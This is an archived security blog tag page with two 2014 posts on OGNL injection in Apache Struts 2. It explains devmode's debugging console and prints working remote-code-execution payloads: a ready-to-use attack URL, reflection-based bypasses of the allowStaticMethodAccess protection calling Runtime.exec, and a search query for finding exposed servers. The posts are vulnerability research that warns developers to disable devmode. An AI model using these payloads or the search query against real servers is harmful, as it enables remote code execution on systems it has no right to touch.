

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>OGNL - Page 1 - &lt;/pwntester&gt;</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/tag/ognl/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="&lt;/pwntester&gt;">
    <meta property="og:type" content="website">
    <meta property="og:title" content="OGNL - Page 1 - &lt;/pwntester&gt;">
    <meta property="og:url" content="http://www.pwntester.com/tag/ognl/">
    <meta property="article:modified_time" content="2014-05-04T16:31:52.000Z">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="OGNL - Page 1 - &lt;/pwntester&gt;">
    <meta name="twitter:url" content="http://www.pwntester.com/tag/ognl/">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Series",
    "publisher": {
        "@type": "Organization",
        "name": "&lt;/pwntester&gt;",
        "logo": "http://www.pwntester.com/content/images/2014/May/rooted.jpeg"
    },
    "url": "http://www.pwntester.com/tag/ognl/",
    "name": "OGNL",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://www.pwntester.com"
    }
}
    </script>

    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="tag-template tag-ognl">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        

<header class="tag-archive-header">
    <h4><i class="fa fa-tag"></i><span class="tag-archive-header-name">OGNL</span></h4>
</header>


<article class="post tag-java tag-ognl tag-struts2">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-21">21 Jan 2014</time> on <a href="../java/">Java</a>, <a href="index.html">OGNL</a>, <a href="../struts2/">Struts2</a></span>
        <h2 class="post-title"><a href="../../blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/">Struts 2 devmode: An OGNL backdoor</a></h2>

    </header>
    <section class="post-content">
        <p>There are many Struts 2 developers familiar with the Struts 2 <a href="http://struts.apache.org/release/2.3.x/docs/devmode.html">development mode</a> on which more verbose logs are produced and handy resource reloading is done on a request basis to avoid restarting the server every time we change a property, validator and so on. <br>
What it is not so well known (actually it doesn’t even appear in the Struts 2 <a href="http://struts.apache.org/release/2.3.x/docs/devmode.html">devmode site</a>) is that it enables a OGNL injection backdoor allowing the developers to check their Value Stacks with ease and from a handy OGNL console or request parameter. This handy feature for developers turns into a security nightmare if application is released into production servers with this flag on.</p>

<p>If we look at the <a href="http://struts.apache.org/release/2.3.x/docs/debugging.html">“debugging” page</a>, we can find some info on how it works. It enables the <a href="http://struts.apache.org/release/2.3.x/docs/debugginginterceptor.html">debugging interceptor</a> which brings us some interesting commands:</p>

<ul>
<li><strong>xml</strong>: Dumps the parameters, context, session, and value stack as an XML document.</li>
<li><strong>console</strong>: Shows a popup 'OGNL Console' that allows the user to test OGNL expressions against the value stack. The XML data from the 'xml' mode is inserted at the top of the page.</li>
</ul>

<p><img src="../../content/images/octopress/devmode-1.png" alt=""></p>

<ul>
<li><strong>command</strong>: Tests an OGNL expression and returns the string result. Only used by the OGNL console.</li>
<li><strong>browser</strong>: Shows field values of an object specified in the object parameter (#context by default). When the object parameters is set, the '#' character needs to be escaped to '%23'. Like debug=browser&amp;object=%23parameters</li>
</ul>

<p><img src="../../content/images/octopress/devmode-2.png" alt=""></p>

<p>So we can abuse this feature to run our arbitrary commands by loading the following page:</p>

<pre><code class="language-lang-bash line-numbers ">http://vulnserver.com/some.action?debug=command&amp;expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,@java.lang.Runtime@getRuntime%28%29.exec%28%27/Applications/Calculator.app/Contents/MacOS/Calculator%27%29  
</code></pre>

<p>Note that this will work even with the latest Struts 2 version (where “allowStaticMethodAccess” is immutable) using the payload explained in this <a href="http://www.pwntester.com/blog/2014/01/20/time-to-update-your-ognl-payloads/">previous post</a></p>

<p>Now, you may be wondering who releases its applications in devmode? Go, check it yourself:</p>

<pre><code class="language-lang-bash line-numbers ">https://www.google.com/search?q=intitle%3A%22Struts+Problem+Report%22+%22You+are+seeing+this+page+because+development+mode+is+enabled.%22  
</code></pre>

<p>So, don’t forget to disable devmode before releasing your applications to production.</p>
    </section>
</article>


<article class="post tag-java tag-ognl">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-20">20 Jan 2014</time> on <a href="../java/">Java</a>, <a href="index.html">OGNL</a></span>
        <h2 class="post-title"><a href="../../blog/2014/01/20/time-to-update-your-ognl-payloads/">Time to update your OGNL payloads</a></h2>

    </header>
    <section class="post-content">
        <p>OGNL is an expression language for getting and setting properties of Java objects, plus other extras such as list projection, selection, lambda expressions and method invocation. So if attackers can provide the OGNL engine with arbitrary OGNL expressions, they will be able to execute arbitrary code on the application server and/or access and modify any value stored in the Struts 2 value stack.</p>

<p>Struts 2 provided an addition layer of protection by disabling static method invocation so that methods like <strong>java.lang.Runtime.exec</strong> could not be executed. This protection was bypassed in the first place by <a href="https://twitter.com/meder">Meder Kydyraliev</a> who came up with the following OGNL expression where he was able to modify the required objects in order to disable the protection before actually calling the static methods:</p>

<pre><code class="language-lang-java line-numbers data-line=1 ">#_memberAccess['allowStaticMethodAccess'] = true
#rt = @java.lang.Runtime@getRuntime()
#rt.exec('calc')
</code></pre>

<p>Its important to note that even if static methods were not allowed, an attacker will normally be able to modify objects stored in the Value Stack like “Session” and cause severe damage to the running application and back end.</p>

<p>Due to the severity of the vulnerabilities and the number of them being reported at that time, Struts 2 decided to make the <strong>#_memberAccess</strong> “<strong>allowStaticMethodAccess</strong>” member immutable in version 2.3.14.2, effectively disabling Meder’s payload.</p>

<p>This control is still easily bypassable using basic Java reflection to set the “<strong>allowStaticMethodAccess</strong>” as an accessible field:</p>

<pre><code class="language-lang-java line-numbers data-line=1-3 ">#f = #_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')
#f.setAccessible(true)
#f.set(#_memberAccess, true)
#rt = @java.lang.Runtime@getRuntime()
#rt.exec('calc')
</code></pre>

<p>Note that even if the application is using the latest Struts 2 version, a developer can still pass user controlled data to Struts 2 methods evaluating their arguments as OGNL Expressions as the <a href="http://security.coverity.com/advisory/2013/Oct/remote-code-execution-in-apache-roller-via-ognl-injection.html"><strong>Apache Roller</strong> vulnerability</a> found by <a href="https://twitter.com/jonpasski">Jon Passki</a></p>
    </section>
</article>


<nav class="pagination" role="navigation">
    <span class="page-number">Page 1 of 1</span>
</nav>

    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/prism.js?v=d47df0f104"></script>

</body>

